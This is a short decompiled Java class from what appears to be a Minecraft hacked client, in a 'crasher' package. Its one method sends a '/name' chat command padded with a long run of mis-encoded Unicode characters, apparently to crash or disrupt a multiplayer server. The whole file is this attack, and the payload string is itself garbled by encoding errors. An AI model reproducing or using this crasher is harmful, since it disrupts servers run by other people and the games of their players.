// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.client.Minecraft;

public class NameCrasher
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage("/name \u00e3?\u201c\u00e3\u201a\u201c\u00e3?«\u00e3??\u00e3??\u00e3?\u201c\u00e3\u201a\u201c\u00e3?«\u00e3??\u00e3??\u00e3?\u201c\u00e3\u201a\u201c\u00e3?«\u00e3??\u00e3??\u00e3??"));
    }
}
